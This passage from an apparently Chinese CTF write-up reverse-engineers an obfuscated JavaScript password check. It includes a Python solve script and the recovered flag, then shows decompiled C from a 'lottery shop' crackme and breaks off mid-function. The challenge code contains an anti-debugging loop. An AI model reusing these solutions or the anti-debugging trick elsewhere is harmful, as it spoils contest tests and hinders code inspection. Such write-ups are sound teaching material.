class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是手动解</p><ul><li>从目标数组入手回溯</li><li>查看对目标数组操作的函数，尝试逆向</li><li>逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出</li><li>根据这个方法可以推测出<code>_H4H4H4</code>的实际作用是相加，<code>_H4H4H4H4</code>的实际功能是前两个参数相减，第三个参数是摆设</li><li>涉及到随机数的参数大概率没什么用</li></ul><p>最后手动解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">h_a, h_b, h_c</span>) </span>&#123;</span><br><span class="line">  a = h_a + h_c + (((~h_b &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>) + (((~h_c &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>)</span><br><span class="line">  a = h_a + h_c + <span class="number">256</span>-h_b + <span class="number">256</span>-h_c</span><br><span class="line">  a = <span class="number">512</span> + h_a - h_b</span><br><span class="line">  <span class="comment">// a = add(h_a, h_c);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_b &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_c &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">userinput</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> pass_err = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  userin = [];</span><br><span class="line">  target = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (userinput.length != <span class="number">39</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  in_slice = userinput.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  userinput = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; in_slice.length; i++) &#123;</span><br><span class="line">    userinput.push(in_slice.charCodeAt(i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">p_a, p_b</span>) </span>&#123;</span><br><span class="line">    p_b = p_b || <span class="number">1</span>;</span><br><span class="line">    p_a = p_a || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> p_seed = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(p_a + p_seed * (p_b - p_a));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userinput.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = add(userinput[i], i) ^ i;</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = sub(tmp ^ userinput[i + <span class="number">1</span>], Hur1k.charCodeAt([i / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (userin.length != <span class="number">32</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userin.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (userin[i] != target[i]) &#123;</span><br><span class="line">      pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hur1k = <span class="string">&quot;Hur1k&quot;</span></span><br><span class="line">s = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>]</span><br><span class="line">charCode = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">-1</span>, <span class="number">-2</span>):</span><br><span class="line">    s[i+<span class="number">1</span>] = ((s[i+<span class="number">1</span>]+<span class="built_in">ord</span>(Hur1k[charCode[i]]))&amp;<span class="number">255</span>)^s[i]</span><br><span class="line">    s[i] = (s[i]^i)-i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>一些解混淆的网站</p><ul><li><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a></li><li><a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a></li><li><a href="https://www.dejs.vip/">主页 - DeJs</a></li><li><a href="https://deobfuscate.relative.im/">JavaScript Deobfuscator (relative.im)</a></li></ul><p>工具</p><ul><li>v_jstools（浏览器插件，需配置） – <a href="https://blog.csdn.net/freeking101/article/details/121668637">网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客</a></li></ul><h2 id="lotery-shop"><a href="#lotery-shop" class="headerlink" title="lotery shop"></a>lotery shop</h2><p>核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_140017AC0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+60h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">80</span>]; <span class="comment">// [rsp+68h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+B8h] [rbp+58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">96</span>]; <span class="comment">// [rsp+108h] [rbp+A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">80</span>]; <span class="comment">// [rsp+168h] [rbp+108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">20</span>]; <span class="comment">// [rsp+1B8h] [rbp+158h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">20</span>]; <span class="comment">// [rsp+208h] [rbp+1A8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">20</span>]; <span class="comment">// [rsp+258h] [rbp+1F8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+2A8h] [rbp+248h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">76</span>]; <span class="comment">// [rsp+2F8h] [rbp+298h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v12[<span class="number">8</span>]; <span class="comment">// [rsp+344h] [rbp+2E4h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13[<span class="number">19</span>]; <span class="comment">// [rsp+364h] [rbp+304h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">180</span>]; <span class="comment">// [rsp+3B0h] [rbp+350h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">148</span>]; <span class="comment">// [rsp+464h] [rbp+404h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+6B4h] [rbp+654h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">266</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v13[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">  j_memset(v14, <span class="number">0</span>, <span class="number">30u</span>i64);</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_14001117C(v3, <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span>);</span><br><span class="line">  sub_14001117C(v4, <span class="string">&quot;You&#x27;re our first customer!&quot;</span>);</span><br><span class="line">  sub_1400114CE(v5, <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>);</span><br><span class="line">  sub_14001117C(v6, <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>);</span><br><span class="line">  sub_14001117C(v7, <span class="string">&quot;1.buy a lottery ticket&quot;</span>);</span><br><span class="line">  sub_14001117C(v8, <span class="string">&quot;2.Check to see if you won&quot;</span>);</span><br><span class="line">  sub_14001117C(v9, <span class="string">&quot;3.join us&quot;</span>);</span><br><span class="line">  sub_14001117C(v10, <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>);</span><br><span class="line">  sub_14001117C(v11, <span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">  sub_1400110FF(</span><br><span class="line">    (<span class="keyword">int</span>)v3,</span><br><span class="line">    (<span class="keyword">int</span>)v4,</span><br><span class="line">    (<span class="keyword">int</span>)v5,</span><br><span class="line">    (<span class="keyword">int</span>)v6,</span><br><span class="line">    (__int64)v7,</span><br><span class="line">    (__int64)v8,</span><br><span class="line">    (__int64)v9,</span><br><span class="line">    (__int64)v10,</span><br><span class="line">    (__int64)v11,</span><br><span class="line">    (__int64)v13,</span><br><span class="line">    (__int64)v15,</span><br><span class="line">    (__int64)v14);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_14001156E((<span class="keyword">int</span>)v7, (<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)v9, (<span class="keyword">int</span>)v10, v11, v6);</span><br><span class="line">      sub_1400113CA(<span class="string">&quot;%d&quot;</span>, v12);</span><br><span class="line">      v16 = v12[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v12[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">      sub_1400111EF(v15, (__int64)v14);</span><br><span class="line">      sub_1400111BD();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_140011708(v15, v14, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[<span class="number">0</span>]);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_14001149C();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_1400114E7();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome again&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有有关flag的信息，真正的flag在<code>sub_1400110FF</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140016760</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a1,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a2,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a3,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a4,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a5,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a6,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a7,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a8,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a9,</span></span></span><br><span class="line"><span class="function"><span class="params">        _DWORD *a10,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> *a11,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+1E8h] [rbp+1C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+284h] [rbp+264h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2A4h] [rbp+284h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2C4h] [rbp+2A4h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+2E8h] [rbp+2C8h]</span></span><br><span class="line"></span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v14 = (_BYTE *)sub_1400112AD(<span class="number">14</span>i64);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a2);</span><br><span class="line">  v14[<span class="number">9</span>] = *a5;</span><br><span class="line">  v14[<span class="number">2</span>] = v14[<span class="number">9</span>];</span><br><span class="line">  v14[<span class="number">1</span>] = *(_BYTE *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">  v14[<span class="number">10</span>] = *(_BYTE *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">  v14[<span class="number">7</span>] = *(_BYTE *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">  v14[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">  v14[<span class="number">3</span>] = *(_BYTE *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">  v14[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">  v14[<span class="number">4</span>] = v14[<span class="number">7</span>];</span><br><span class="line">  *v14 = <span class="built_in">tolower</span>((<span class="keyword">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">  v14[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="keyword">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">  v14[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">  v14[<span class="number">6</span>] = v14[<span class="number">3</span>];</span><br><span class="line">  v14[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">  v12 = 